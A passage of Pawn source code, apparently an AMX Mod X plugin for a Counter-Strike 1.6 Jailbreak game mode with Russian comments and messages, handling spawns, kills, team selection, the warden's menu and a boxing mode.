	else if(get_user_weapon(id) != CSW_KNIFE && jb_get_chay())
	{
		if(get_user_team(id) == 2)
		{
			set_pev(id, pev_viewmodel2, Hands[2])
			set_pev(id, pev_weaponmodel2, Hands[3])
		}		
		else if(get_user_team(id) == 1)
		{
			set_pev(id, pev_viewmodel2, Hands[0])
			set_pev(id, pev_weaponmodel2, Hands[1])		
		}
	}
	return PLUGIN_CONTINUE
}


// Замена звуков
public sound_emit(id, channel, const sound[], Float:volume, Float:attn, flags, pitch)
{
	if(!is_user_alive(id))
	return FMRES_IGNORED	
		
	if(equal(sound, "weapons/knife_stab.wav"))
	{
		if(get_user_team(id) == 1)
		{
			if(g_BoxStarted && equal(g_BoxWeapon, "Кулаки"))
				emit_sound(id, CHAN_WEAPON, HandsSound[11], random_float(0.6, 1.0), ATTN_NORM, 0, PITCH_NORM)
			else
				emit_sound(id, CHAN_WEAPON, HandsSound[0], random_float(0.6, 1.0), ATTN_NORM, 0, PITCH_NORM)
		}
		else if(get_user_team(id) == 2)
		emit_sound(id, CHAN_WEAPON, HandsSound[5], random_float(0.6, 1.0), ATTN_NORM, 0, PITCH_NORM)
		return FMRES_SUPERCEDE
	}
	else if(equal(sound, "weapons/knife_hitwall1.wav"))
	{
		if(get_user_team(id) == 1)
		emit_sound(id, CHAN_WEAPON, HandsSound[1], 1.0, ATTN_NORM, 0, PITCH_LOW)
		else if(get_user_team(id) == 2)
		emit_sound(id, CHAN_WEAPON, HandsSound[6], 1.0, ATTN_NORM, 0, PITCH_LOW)
		return FMRES_SUPERCEDE
	}
	else if(equal(sound, "weapons/knife_deploy1.wav"))
	{
		if(get_user_team(id) == 1)
		emit_sound(id, CHAN_WEAPON, HandsSound[2], 1.0, ATTN_NORM, 0, PITCH_NORM)
		else if(get_user_team(id) == 2)
		emit_sound(id, CHAN_WEAPON, HandsSound[7], 1.0, ATTN_NORM, 0, PITCH_NORM)
		return FMRES_SUPERCEDE
	}
	else if(equal(sound, "weapons/knife_slash1.wav") || equal(sound, "weapons/knife_slash2.wav"))
	{
		if(get_user_team(id) == 1)
		emit_sound(id, CHAN_WEAPON, HandsSound[3], 1.0, ATTN_NORM, 0, PITCH_NORM)
		else if(get_user_team(id) == 2)
		emit_sound(id, CHAN_WEAPON, HandsSound[8], 1.0, ATTN_NORM, 0, PITCH_NORM)		
		return FMRES_SUPERCEDE
	}
	else if(equal(sound, "weapons/knife_hit1.wav") || equal(sound, "weapons/knife_hit2.wav") || equal(sound, "weapons/knife_hit3.wav") || equal(sound, "weapons/knife_hit4.wav"))
	{
		if(get_user_team(id) == 1)
		{
			if(!get_dance())
			{
			if(g_BoxStarted && equal(g_BoxWeapon, "Кулаки"))
			emit_sound(id, CHAN_WEAPON, HandsSound[10], random_float(0.6, 1.0), ATTN_NORM, 0, PITCH_NORM)
			else
			emit_sound(id, CHAN_WEAPON, HandsSound[4], random_float(0.6, 1.0), ATTN_NORM, 0, PITCH_NORM)
			}
		}
		else if(get_user_team(id) == 2)
			emit_sound(id, CHAN_WEAPON, HandsSound[9], random_float(0.6, 1.0), ATTN_NORM, 0, PITCH_NORM)
			
		return FMRES_SUPERCEDE
	}
			
	return FMRES_IGNORED
}




// Отлов спавна игрока
public player_spawn(id)
{
	if(!is_user_alive(id))
	return HAM_IGNORED
		
	set_pdata_float(id, 198, get_gametime() + 999.0)
	
	player_strip_weapons(id)
	set_user_maxspeed(id, 240.0)
	set_user_rendering(id, kRenderFxNone, 0, 0, 0, kRenderNormal, 0)
	clear_bit(g_PlayerFreeday, id)
	clear_bit(g_PlayerWanted, id)
	clear_bit(g_PlayerRevolt, id)
	remove_task(id + TASK_FD_ONE)
	szTimeFD[id][0] = 0
	szPlayerFDTime[id] = 0
	
	if(g_RoundEnd)
	{
		g_RoundEnd = 0
		if(g_Days < 7)
		{
			g_Days++
		}
		else
		{
			g_Days = 1
		}
		
		if(iFreeDay > 0)
		iFreeDay = 0
		if(g_WantedNum > 0)
		g_WantedNum = 0
		
	}	
	
	switch(get_user_team(id))
	{
		case(1):
		{
			if(get_bit(g_AutoVoice, id))
			{
				set_bit(g_PlayerVoice, id)
				autovoice[id] = true
				ChatColor(id, "%s !yВы получили возможность !gразговаривать по микрофону", Prefix)
			}
			
			if(g_Fdall)
			{
			jb_set_model(id, ZekUJB)
			entity_set_int(id, EV_INT_skin, 5)
			}
			else 
			{
				if(jb_get_svip_model(id))
				jb_set_model(id, SuperVIP)
				else
				{
				jb_set_model(id, ZekUJB)
				entity_set_int(id, EV_INT_skin, random_num(0, 3))
				}
			}
			cs_set_user_armor(id, 0, CS_ARMOR_NONE)
			
			if(g_BoxStarted && equal(g_BoxWeapon, "Кулаки"))
			{
				g_BoxGloves[id] = 1
			}
		}
		case(2):
		{
			if(jb_get_svip_model(id))
			jb_set_model(id, SuperVIP)
			else
			{
			jb_set_model(id, GuardUJB)
			}
			cs_set_user_armor(id, 100, CS_ARMOR_VESTHELM)
		}
	}
	set_task(1.0, "Kill_Blocked_Bxod", id)
	
	return HAM_IGNORED
}

public Kill_Blocked_Bxod(id)
{
	if(is_user_alive(id))
	{
		if(SpawnBlocked && !(get_user_flags(id) & ADMIN_LEVEL_B)){
			ChatColor(id, "%s !yВы будете играть со следующего раунда, ожидайте пожалуйста.", Prefix)
			user_silentkill(id)
		}
	}
	return PLUGIN_HANDLED
}

public button_attack(button, id, Float:damage, Float:direction[3], tracehandle, damagebits)
{
	if(is_valid_ent(button) && (get_user_team(id) == 2 || g_PlayerLast == id))
	{
		ExecuteHamB(Ham_Use, button, id, 0, 2, 1.0)
		entity_set_float(button, EV_FL_frame, 0.0)
	}
	return HAM_IGNORED
}

public player_damage(victim, ent, attacker, Float:damage, bits)
{
	if (victim == attacker || !is_user_connected(attacker))
		return HAM_IGNORED
		
	if(get_user_team(attacker) == 1 && get_user_team(victim) == 1 && !g_BoxStarted)
		return HAM_SUPERCEDE

	switch(g_Duel)
	{
		case(0):
		{
			
		}
		case(2):
		{
			if(g_PlayerLast != attacker)
				return HAM_SUPERCEDE
		}
		default:
		{
			if(g_Duel > 4 && (victim == g_DuelA && attacker == g_DuelB) || (victim == g_DuelB && attacker == g_DuelA))
				return HAM_IGNORED
	
			return HAM_SUPERCEDE
		}
	}	
		
	return HAM_IGNORED
}


public player_attack(victim, attacker, Float:damage, Float:direction[3], tracehandle, damagebits)
{
	if(jb_get_chay())
		return HAM_IGNORED
		
	if(!is_user_connected(victim) || !is_user_connected(attacker) || victim == attacker)
		return HAM_IGNORED
		
	if(get_user_team(attacker) == 1 && get_user_team(victim) == 1 && !g_BoxStarted)
		return HAM_SUPERCEDE
		
	static CsTeams:vteam, CsTeams:ateam
	
	vteam = cs_get_user_team(victim)
	ateam = cs_get_user_team(attacker)
	
	if(ateam == CS_TEAM_CT && vteam == CS_TEAM_CT)
		return HAM_SUPERCEDE
	
	if(ateam == CS_TEAM_T && vteam == CS_TEAM_CT && g_PlayerLast <= 0 && !round_restart)
	{

		if(!g_PlayerRevolt)
		
			client_cmd(0,"spk UJB/trevoga.wav")
			
		set_bit(g_PlayerRevolt, attacker)
		
		if(get_bit(g_PlayerFreeday, attacker)){
			clear_bit(g_PlayerFreeday, attacker)
			iFreeDay--
			entity_set_int(attacker, EV_INT_skin, random_num(0, 3))
		}
	}

	switch(g_Duel)
	{
		case(0):
		{
			
		}
		case(2):
		{
			if(g_PlayerLast != attacker)
				return HAM_SUPERCEDE
		}
		default:
		{
			if(g_Duel > 4 && (victim == g_DuelA && attacker == g_DuelB) || (victim == g_DuelB && attacker == g_DuelA))
				return HAM_IGNORED

			return HAM_SUPERCEDE
		}
	}	
	
	return HAM_IGNORED
}


// Отлов убийства
public player_killed(victim, attacker, shouldgib)
{
	if(!is_user_connected(attacker) || !is_user_connected(victim))
		return HAM_IGNORED

	static CsTeams:vteam, CsTeams:kteam
	
	vteam = cs_get_user_team(victim)
	kteam = cs_get_user_team(attacker)
		
	if(kteam == vteam)
	{
		if(cs_get_user_money(attacker) >= 3200)
		cs_set_user_money(attacker, cs_get_user_money(attacker) + 3300, 0)
		else
		cs_set_user_money(attacker, cs_get_user_money(attacker) + g_PlayerMoney[attacker], 0)
	}
	
	if(get_bit(g_PlayerWanted, victim))
	{
		g_WantedNum--
		clear_bit(g_PlayerRevolt, victim)
		clear_bit(g_PlayerWanted, victim)
	}
	
	if(get_bit(g_PlayerFreeday, victim))
	{
		iFreeDay--
		clear_bit(g_PlayerFreeday, victim)
	}
	
	if(g_BoxStarted && get_user_team(victim) == 1)
	{
		cs_set_user_deaths(attacker, cs_get_user_deaths(attacker) - 1)
		strip_user_weapons(victim)
	}
	
	if(jb_get_ninja(victim) > 0)
	strip_user_weapons(victim)

	switch(g_Duel)
	{
		case(0):
		{
			switch(vteam)
			{
				case(CS_TEAM_CT):
				{
					if(CountTLive <= 1)
					return HAM_IGNORED
					
					if(kteam == CS_TEAM_T)
					{
						new name[32], name2[32]
						get_user_name(attacker, name, 31)
						get_user_name(victim, name2, 31)
						
						if(!get_bit(g_PlayerWanted, attacker))
						{
						if(get_bit(g_PlayerFreeday, attacker))
						{
							iFreeDay--
							clear_bit(g_PlayerFreeday, attacker)
						}
						set_bit(g_PlayerWanted, attacker)
						jb_set_model(attacker, ZekUJB)
						entity_set_int(attacker, EV_INT_skin, 6)
						g_WantedNum++
						}
						
						if(g_Simon == victim)
						{
						cs_set_user_money(attacker, cs_get_user_money(attacker) + 3000)
						ChatColor(0, "%s !yЗек: !g%s !yотправил !gНачальника !yв отставку :)", Prefix, name)
						g_Simon = 0
						}
						else
						ChatColor(0, "%s !yЗек: !g%s !yотхуярил охранника: !g%s", Prefix, name, name2)
					}
				}
			}
		}
		default:
		{
			if(g_Duel != 2 && (attacker == g_DuelA || attacker == g_DuelB))
			{
				new name[32], names[32]
				get_user_name(g_DuelA, name, 31)
				get_user_name(g_DuelB, names, 31)
				set_user_rendering(victim, kRenderFxNone, 0, 0, 0, kRenderNormal, 0)
				set_user_rendering(attacker, kRenderFxNone, 0, 0, 0, kRenderNormal, 0)
				
				if(attacker == g_DuelA && victim == g_DuelB)
				ChatColor(0, "%s !yЗек: !g%s !yпобедил в дуэли против Охранника: !g%s", Prefix, name, names)
				else if(attacker == g_DuelB && victim == g_DuelA)
				ChatColor(0, "%s !yОхранник: !g%s !yпобедил в дуэли против Зека: !g%s", Prefix, names, name)
				
				g_DuelA = 0
				g_DuelB = 0
				g_Duel = 0
				g_DuelType = 0
				g_LastDenied = 0
				g_BlockWeapons = 0
				g_PlayerLast = 0
				DuelName = "не определен"
				remove_task(victim + 10000)
				remove_task(attacker + 10000)

				if(jb_get_ninja(attacker) > 0)
				jb_strip_ninja(attacker)
				else if(jb_get_ninja(victim) > 0)
				jb_strip_ninja(victim)
			}
		}
	}
	if (get_user_team(attacker) == 2 && get_user_team(victim) == 1)
	{
		new menu[512], iLen, i
		new vname[32]

		g_victim[attacker] = victim

		get_user_name(g_victim[attacker], vname, charsmax(vname))

		iLen = 0
					
		iLen = formatex(menu[iLen], charsmax(menu) - iLen, "\yЗа что вы убили игрока: \r%s \d?", vname)
				
		for (i = 0;i < sizeof(g_reasons);i++)
			iLen += formatex(menu[iLen], charsmax(menu) - iLen, "^n\r%d.\w %s", i + 1, g_reasons[i])
					
		//iLen += formatex(menu[iLen], charsmax(menu) - iLen, "\r0. \wВыход")
			
		show_menu(attacker, RESONS_MENU_KEYS, menu, -1, "ReasonsMenu")
	}	
	
	return HAM_IGNORED
}

public menu_reason(id, key)
{
	new kname[32], vname[32]

	switch (key)
	{
		case 0, 1, 2, 3, 4, 5, 6, 7:
		{
			get_user_name(id, kname, charsmax(kname))
			get_user_name(g_victim[id], vname, charsmax(vname))
			ChatColor(0, "%s !yОхранник: !t%s !yубил зека: !t%s !yпо причине: !g%s", Prefix, kname, vname, g_reasons[key])
		}
	}
	return PLUGIN_HANDLED
}

// Выдача Саймона
public cmd_simon(id)
{
	if(get_user_team(id) != 2 || !is_user_alive(id) || BlockSimon || g_PlayerLast > 0 || jb_get_chay())
	return PLUGIN_HANDLED
	
	if(!g_Simon && !g_Fdall)
	{
		new name[32]
		
		g_Simon = id
		
		if(jb_get_svip_model(id))
		jb_set_model(id, SuperVIP)
		else
		jb_set_model(id, SimonUJB)
		ChekWeaponAmount[id] = 3
		cmd_simonmenu(id)
		get_user_name(g_Simon, name, 31)
		ChatColor(0, "%s !yОхранник: !t%s !yстал !gНачальником Тюрьмы!t.", Prefix, name)
		remove_task(TASK_AUTO_FD)
	}
	else if(g_Simon) ChatColor(0, "%s !yРоль начальника тюрьмы уже занята.", Prefix)
	else if(g_Fdall) ChatColor(0, "%s !yВо время !gСвободного Дня !yроль !gСаймона запрещена.", Prefix)
	return PLUGIN_HANDLED
}
  
 
 
 
public jointeam(id)
	return PLUGIN_HANDLED

public message_ShowMenu(iMsgid, iDest, id)
{
	return PLUGIN_HANDLED
}


public message_VGUIMenu(iMsgid, iDest, id)
{
	if(get_msg_arg_int(1) != 2)
		return PLUGIN_CONTINUE;
		
	set_task(3.0, "servmenu", id)
	return PLUGIN_HANDLED;
}

public team_menu(id) 
{
	if(!is_user_connected(id))
		return PLUGIN_HANDLED

	new Text[512]
	formatex(Text, charsmax(Text), "\dВыбор команды:^n^n\yВКонтакте: \r%s\w", vkontakte)
	new menu = menu_create(Text, "menu_handler")

	//1
	if(get_user_team(id) != 1 && g_BlockTeam[id] == 0)
		formatex(Text, charsmax(Text), "Заключенные\r[\d%d\r]", CountT)
	else
		formatex(Text, charsmax(Text), "\dЗаключенные\r[\y%d\r]", CountT)
	menu_additem(menu, Text, "1")


	if(!get_locked() && get_user_team(id) != 2 && !g_BlockTeam[id] && (float(CountT) / 3 > float(CountCT)) || CountCT == 0)
		formatex(Text, charsmax(Text), "Охранники\r[\w%d\r]", CountCT)

	else if(get_locked() || jb_block_kt(id)) 
		formatex(Text, charsmax(Text), "\dОхранники \w[\rЗаблокировано\w]")
	
	else if(!get_locked())
		formatex(Text, charsmax(Text), "\dОхранники\r[\y%d\r]", CountCT)
	menu_additem(menu, Text, "2")
	
	if(get_user_team(id) == 1 || get_user_team(id) == 2)
	{
	if(get_user_team(id) != 3 && CountSP < 5)
	formatex(Text, charsmax(Text), "\wНаблюдатели \r[\d%d\r]", CountSP)
	else
	formatex(Text, charsmax(Text), "\dНаблюдатели \r[\y%d\r]", CountSP)
	menu_additem(menu, Text, "3")	
	}
	
	menu_setprop(menu, MPROP_EXITNAME, "Выход")
	menu_display(id, menu, 0)

	return PLUGIN_HANDLED
}

public menu_handler(id, menu, item) 
{		
	if(item == MENU_EXIT)
		return PLUGIN_HANDLED

	new dst[32], data[5], access, callback, name[32]
	new iMsgBlock = get_msg_block(114)

	set_msg_block(114, BLOCK_SET)
	new MsgBlock = get_msg_block(96)
	set_msg_block(96, BLOCK_SET)

	menu_item_getinfo(menu, item, access, data, charsmax(data), dst, charsmax(dst), callback)
	menu_destroy(menu)
	     
	//new key = str_to_num(data)
	     
	switch(data[0])
	{
		case ('1'): 
		{			
			if(get_user_team(id) == 1)
			{
				client_print(id, print_center, "Вы уже находитесь в команде Заключенных")
				return PLUGIN_HANDLED
			}
			
			if(g_BlockTeam[id] != 0)
			{
				client_print(id, print_center, "Вы не можете менять команды так часто")
				return PLUGIN_HANDLED
			}

			if(cs_get_user_team(id) != CS_TEAM_T)
			{
				engclient_cmd(id, "jointeam", "1")
				engclient_cmd(id, "joinclass", "1")
				if(g_BlockTeams[id] > 0)
				g_BlockTeam[id] = 2
				else
				g_BlockTeams[id]++
			}
			else client_print(id, print_center, "Вы и так за заключенных")
		}
		case ('2'): 
		{
			if(get_user_team(id) == 2)
			{
				client_print(id, print_center, "Вы уже находитесь в команде Охранников")
				return PLUGIN_HANDLED
			}
			
			if(g_BlockTeam[id] != 0)
			{
				client_print(id, print_center, "Вы не можете менять команды так часто")
				return PLUGIN_HANDLED
			}
			
			if(jb_block_kt(id))
			{
				ChatColor(id, "%L", id, "JB_BLOCKCT_YOUBLOCK")
				return PLUGIN_HANDLED
			}
			else if(get_locked())
			{
				client_print(id, print_center, "Вход за охранников заблокирован Администрацией")
				return PLUGIN_HANDLED
			}
			else if(get_bit(g_PlayerFreeday, id) || get_bit(g_PlayerWanted, id))
			{
				client_print(id, print_center, "На данный момент перод за Охрану недоступен")
				return PLUGIN_HANDLED
			}
				
			if(!g_BlockTeam[id] && (float(CountT) / 3 > float(CountCT) || CountCT == 0))
			//if(!g_BlockTeam[id] && (CountCT== 0 || is_ct_allowed()))
			{
				if(get_user_team(id) != 2)
				{
					engclient_cmd(id, "jointeam", "2")
					engclient_cmd(id, "joinclass", "2")
					if(g_BlockTeams[id] > 0)
					g_BlockTeam[id] = 2
					else
					g_BlockTeams[id]++
				}
				else client_print(id, print_center, "Вы и так находитесь в команде охранников")
			}
			else ChatColor(id, "!y[!gСервер!y] Смена команды !gневозможна. !tОхранников слишком много")
		}
		case ('3'): 
		{
			if(get_user_team(id) == 3)
			{
				client_print(id, print_center, "Вы и так в наблюдателях")
				return PLUGIN_HANDLED
			}
			
			if(CountSP >= 5)
			{
				client_print(id, print_center, "Все места в спектрах заняты, попробуйте позже.")
				return PLUGIN_HANDLED
			}
			
			if(get_user_team(id) != 3)
			{
				get_user_name(id, name, 31)
				
				g_BlockTeam[id] = 0
				
				if((get_user_team(id) == 1 || get_user_team(id) == 2) && is_user_alive(id))
				user_silentkill(id)
				
				cs_set_user_team(id, CS_TEAM_SPECTATOR)
				client_print(0, print_chat, "Игрок: %s зашел за наблюдателей", name)
			}

		}
	}
	set_msg_block(114, iMsgBlock)
	set_msg_block(96, MsgBlock)

	return PLUGIN_HANDLED
} 
 
// Саймон меню
public cmd_simonmenu( iPlayer )
{
	g_iPage[iPlayer] = true
        ShowSimonMenu( iPlayer );
}
 
ShowSimonMenu( iPlayer, iPage = true )
{
        if(g_Simon != iPlayer)
                return;
 
        new szMenu[ 512 ];
 
        if( iPage )
        {	
				formatex(szMenu, charsmax( szMenu ), "\yМеню Саймона\r 1/2^n^n\y1. \wОткрыть Клетки^n\y2. \wСвободный день^n\y3. \wПоделить на команды^n\y4. \wФутбол^n\y5. \wГолосовые команды^n\y6. \wБокс^n\y7. \wПередать саймона^n\y8. \wПроверить на оружие(прицел на игрока)\r [\d%d\r]^n^n\y9. \wДальше^n\y0. \wВыход", ChekWeaponAmount[ iPlayer ])
        }
        else
        {	
				formatex( szMenu, charsmax( szMenu ), "\yМеню Саймона \r2/2^n^n\y1. \wДать/Забрать Голос^n\y2. \wВылечить зэка^n\y3. \wУбрать зэка из списка бунтующих^n^n\w9 \wНазад^n\r0. \wВыход")
        }
 
        show_menu( iPlayer, keysmenu, szMenu, -1, "SimonMenu" );
}
 
public menu_simon( iPlayer, iKey )
{
	if(g_Simon != iPlayer)
                return PLUGIN_HANDLED
 
        switch( iKey )
        {
                case 0:
                {
			if( g_iPage[ iPlayer ] )
			{
				if(BlockFlood <= 2){
					new name[32]
					get_user_name(iPlayer,name,32)
					ClearSyncHud(0, g_HudSyncOpen)
					set_hudmessage(251, 166, 81, -1.0, 0.74, 0, 6.0, 3.0, 0.1, 0.0, -1)
					ShowSyncHudMsg(0, g_HudSyncOpen, "%s открыл клетки", name)
					BlockFlood++
					if(BlockFlood == 3)
					set_task(3.1, "off_flood")
								
					jail_open()
					cmd_simonmenu( iPlayer )
				}
				else client_print(iPlayer, print_chat, "[Защита] Перестаньте флудить! ")
			}
			else
			{
				GivePickVoice( iPlayer )
			}
                }
                case 1:
                {
                        if( g_iPage[ iPlayer ] )
                                cmd_freeday( iPlayer )
                        else
                                CurePrisoners( iPlayer )
                }
                case 2:
				{
					if( g_iPage[ iPlayer ])
						MenuTeam(iPlayer)
					else
						RemoveFromWanted(iPlayer)
				}
                case 3: {
					if( g_iPage[ iPlayer ])
					open_football_menu(iPlayer)
				}
                case 4: if( g_iPage[ iPlayer ]) VoiceCmdMenu(iPlayer)
                case 5: if( g_iPage[ iPlayer ]) box_menu(iPlayer)
                case 6: if( g_iPage[ iPlayer ]) simon_player(iPlayer)
                case 7: if( g_iPage[ iPlayer ]) CheckWeapon(iPlayer)
                case 8:
                {
					g_iPage[ iPlayer ] = !g_iPage[ iPlayer ]
					ShowSimonMenu( iPlayer, g_iPage[ iPlayer ] );
					return PLUGIN_HANDLED
                }
        }
	return PLUGIN_HANDLED
}

public off_flood()
	BlockFlood = 0
	
public box_menu(id) 
{
	if(g_Simon != id)
	return PLUGIN_HANDLED
	
	if(CountTLive <= 1)
	{
	ChatColor(id, "%s !yБокс меню недоступно, слишком мало заключенных!", Prefix)
	return PLUGIN_HANDLED
	}
	new Buffer[128]

	formatex(Buffer, charsmax(Buffer), "Бокс меню:")
	new menu_boxx = menu_create(Buffer, "menu_box")

	if(!g_BoxStarted)
	formatex(Buffer, charsmax(Buffer), "Бокс \d[\yВыключен\d]")
	else
	formatex(Buffer, charsmax(Buffer), "Бокс \d[\rВключен\d]")
	menu_additem(menu_boxx, Buffer, "1")
	
	if(g_BoxStarted)
	{
	menu_addtext(menu_boxx, "^n\dНастройки бокса: \rотключите бокс!\w", 0)
	menu_addblank(menu_boxx, 1)
	menu_addblank(menu_boxx, 1)	
	menu_addblank(menu_boxx, 1)
	menu_addblank(menu_boxx, 1)
	}
	else
	{
	menu_addtext(menu_boxx, "^n\yНастройки бокса:\w", 0)
	
	formatex(Buffer, charsmax(Buffer), "Здоровье: \w%d", g_BoxHealth)
	menu_additem(menu_boxx, Buffer, "2")
	
	formatex(Buffer, charsmax(Buffer), "Оружие: %s", g_BoxWeapon)
	menu_additem(menu_boxx, Buffer, "3")

	if(g_BoxBlock)
	formatex(Buffer, charsmax(Buffer), "Выброс и поднятие оружия: \rЗаблокировано")
	else
	formatex(Buffer, charsmax(Buffer), "Выброс и поднятие оружия: \yРазрешено")
	menu_additem(menu_boxx, Buffer, "4")

	menu_addblank(menu_boxx, 1)
	}
	
	menu_addblank(menu_boxx, 1)
	menu_addblank(menu_boxx, 1)
	formatex(Buffer, charsmax(Buffer), "Выход")
	menu_setprop(menu_boxx, MPROP_EXITNAME, Buffer)
	     
	menu_display(id,menu_boxx,0)

	return PLUGIN_HANDLED
}
	 
public menu_box(id, menu_boxx, item) 
{
	if(item == MENU_EXIT || g_Simon != id || !is_user_alive(id))
	{
		menu_destroy(menu_boxx)
	        return PLUGIN_HANDLED
	}
	     
	new data[6], iName[64], access, callback
	menu_item_getinfo(menu_boxx, item, access, data, 5, iName, 63, callback)
	     
	new key = str_to_num(data)
	     
	switch(key) 
	{
		case 1:
		{
			if(!g_BoxStarted)
			{
				new TAlive
					
				for(new i = 1; i <= get_maxplayers(); i++)
				{
					if(!is_user_alive(i))
						continue
	
					if(get_user_team(i) == 1 && !get_bit(g_PlayerFreeday, i) && !get_bit(g_PlayerWanted, i))
					{
						TAlive++
						
					}
				}
	
				if(TAlive > 1)
				{
					g_BoxStarted = true
					for(new i = 1; i <= get_maxplayers(); i++)
					{ 
						if(!is_user_alive(i) || get_bit(g_PlayerFreeday, i) || get_bit(g_PlayerWanted, i))
							continue
		
						if(get_user_team(i) == 1)
						{
							player_strip_weapons(i)
							set_user_health(i, g_BoxHealth)
							
							if(equal(g_BoxWeapon, "Диглы"))
							{
								fm_give_item(i, "weapon_deagle")
								engclient_cmd(i, "weapon_deagle")
								cs_set_user_bpammo(i, CSW_DEAGLE, 500)							
							}
							else if(equal(g_BoxWeapon, "Дробовики"))
							{
								fm_give_item(i, "weapon_m3")
								engclient_cmd(i, "weapon_m3")
								
								cs_set_user_bpammo(i, CSW_M3, 500)								
							}
							else if(equal(g_BoxWeapon, "AWP"))
							{
								fm_give_item(i, "weapon_awp")
								engclient_cmd(i, "weapon_awp")
								
								cs_set_user_bpammo(i, CSW_AWP, 500)							
							}
							else if(equal(g_BoxWeapon, "Скаут"))
							{
								fm_give_item(i, "weapon_scout")
								engclient_cmd(i, "weapon_scout")
								
								cs_set_user_bpammo(i, CSW_SCOUT, 500)							
							}
							else if(equal(g_BoxWeapon, "Гранаты"))
							{
								strip_user_weapons(i)
								fm_give_item(i, "weapon_hegrenade")
								engclient_cmd(i, "weapon_hegrenade")
								cs_set_user_bpammo(i, CSW_HEGRENADE, 500)
								
							}
							else if(equal(g_BoxWeapon, "Кулаки"))
							{
								player_strip_weapons(i)
								switch(random_num(1, 2))
								{
									case 1:
									{
										g_BoxGloves[i] = 1
										set_pev(i, pev_viewmodel2, Hands[4])
										set_pev(i, pev_weaponmodel2, Hands[5])	
									}
									case 2:
									{
										g_BoxGloves[i] = 2
										set_pev(i, pev_viewmodel2, Hands[6])
										set_pev(i, pev_weaponmodel2, Hands[7])	
									}
								}
								if(jb_get_ninja(i) > 0)
								{
								jb_set_ninja(i)
								engclient_cmd(i, "weapon_p228")
								}
								else
								engclient_cmd(i, "weapon_knife")
							}
							
						}
					}
					
					ChatColor(0, "%s !yРежим !gБокса !tвключен! !yНастройки !t[!gОружие: !y%s !y| !gХП: !y%d!t]", Prefix, g_BoxWeapon, g_BoxHealth)
					box_menu(id)
				}
				else
				{
					ChatColor(id, "%s !yБокс невозможен! Не хватает заключенных", Prefix)
				}
			}
			else
			{
				g_BoxStarted = false
					
				for(new i = 1; i <= get_maxplayers(); i++)
				{
					if(!is_user_alive(i) || get_bit(g_PlayerFreeday, i) || get_bit(g_PlayerWanted, i))
						continue
												
					if(get_user_team(i) == 1)
					{
						set_user_health(i, 100)
						
						if(equal(g_BoxWeapon, "Диглы"))
						{
							cs_set_user_bpammo(i, CSW_DEAGLE, 0)							
						}
						else if(equal(g_BoxWeapon, "Дробовики"))
						{								
							cs_set_user_bpammo(i, CSW_M3, 0)								
						}
						else if(equal(g_BoxWeapon, "AWP"))
						{
							cs_set_user_bpammo(i, CSW_AWP, 0)							
						}
						else if(equal(g_BoxWeapon, "Скаут"))
						{
							cs_set_user_bpammo(i, CSW_SCOUT, 0)							
						}
						else if(equal(g_BoxWeapon, "Гранаты"))
						{							
							cs_set_user_bpammo(i, CSW_HEGRENADE, 0)
						}							
						
						player_strip_weapons(i)
						
						if(jb_get_ninja(i) > 0)
						{
							jb_set_ninja(i)
							engclient_cmd(i, "weapon_p228")
						}	
						else
						engclient_cmd(i, "weapon_knife")
					}
					
				}
				ChatColor(0, "%s !yРежим !gБокс !yОтключен", Prefix)
				box_menu(id)
			}
		}
		case 2:
		{
			if(g_BoxStarted)
			{
			ChatColor(id, "%s !yВо время бокса запрещено менять настройки!", Prefix)
			return PLUGIN_HANDLED
			}
			
			if(g_BoxParam == 0)
			{
				g_BoxHealth = 150
				g_BoxParam = 1
				box_menu(id)
			}
			else if(g_BoxParam == 1)
			{
				g_BoxHealth = 200
				g_BoxParam = 2
				box_menu(id)
			}
			else if(g_BoxParam == 2)
			{
				g_BoxHealth = 255
				g_BoxParam = 3
				box_menu(id)
			}
			else if(g_BoxParam == 3)
			{
				g_BoxHealth = 500
				g_BoxParam = 4
				box_menu(id)
			}
			else if(g_BoxParam == 4)
			{
				g_BoxHealth = 1000
				g_BoxParam = 5
				box_menu(id)
			}
			else if(g_BoxParam == 5)
			{
				g_BoxHealth = 1500
				g_BoxParam = 6
				box_menu(id)
			}
			else if(g_BoxParam == 6)
			{
				g_BoxHealth = 100
				g_BoxParam = 0
				box_menu(id)
			}
		}
		case 3:
		{
			if(g_BoxStarted)
			{
			ChatColor(id, "%s !yВо время бокса запрещено менять настройки!", Prefix)
			return PLUGIN_HANDLED
			}
			
			if(g_BoxParam1 == 0)
			{
				g_BoxWeapon = "Диглы"
				g_BoxParam1 = 1
				box_menu(id)
			}
			else if(g_BoxParam1 == 1)
			{
				g_BoxWeapon = "Дробовики"
				g_BoxParam1 = 2
				box_menu(id)
			}
			else if(g_BoxParam1 == 2)
			{
				g_BoxWeapon = "AWP"
				g_BoxParam1 = 3
				box_menu(id)
			}
			else if(g_BoxParam1 == 3)
			{
				g_BoxWeapon = "Скаут"
				g_BoxParam1 = 4
				box_menu(id)
			}
			else if(g_BoxParam1 == 4)
			{
				g_BoxWeapon = "Гранаты"
				g_BoxParam1 = 5
				box_menu(id)
			}
			else if(g_BoxParam1 == 5)
			{
				g_BoxWeapon = "Кулаки"
				g_BoxParam1 = 0
				box_menu(id)
			}
		}
		case 4:
		{
			if(g_BoxStarted)
			{
			ChatColor(id, "%s !yВо время бокса запрещено менять настройки!", Prefix)
			return PLUGIN_HANDLED
			}
			
			if(!g_BoxBlock)
			{
				g_BoxBlock = true
			}
			else if(g_BoxBlock)
			{
				g_BoxBlock = false
			}
			box_menu(id)
		}

	}
	return PLUGIN_HANDLED
}

public box_drop(id)
{
	if(g_BoxStarted && g_BoxBlock && get_user_team(id) == 1)
	{
		client_print(id, print_center, "Настройки Бокса запрещают выбрасывать оружие!")
		return PLUGIN_HANDLED
	}
	else if(g_BlockWeapons > 0)
	{
		client_print(id, print_center, "Во время дуэли выброс оружия запрещен!")
		return PLUGIN_HANDLED
	}
	return PLUGIN_CONTINUE
}

public player_cmdstart(id, uc, random)
{
	if(!is_user_alive(id) || !g_Duel)
		return FMRES_IGNORED

	if(g_Duel != 8) // m249
	{
		if(g_Duel == 6)
			cs_set_user_bpammo(id, CSW_DEAGLE, 1)

		else if(g_Duel == 7)
			cs_set_user_bpammo(id, CSW_HEGRENADE, 1)

		else if(g_Duel == 9)
			cs_set_user_bpammo(id, CSW_AWP, 1)

		else if(g_Duel == 10)
			cs_set_user_bpammo(id, CSW_SCOUT, 1)
	}
	
	return FMRES_IGNORED
}

public fw_TouchWeapon(weapon, id)
{
        if(!is_user_connected(id))
                return HAM_IGNORED
        if(g_BoxStarted && g_BoxBlock && get_user_team(id) == 1 || g_BlockWeapons == 1 && g_Duel > 0)
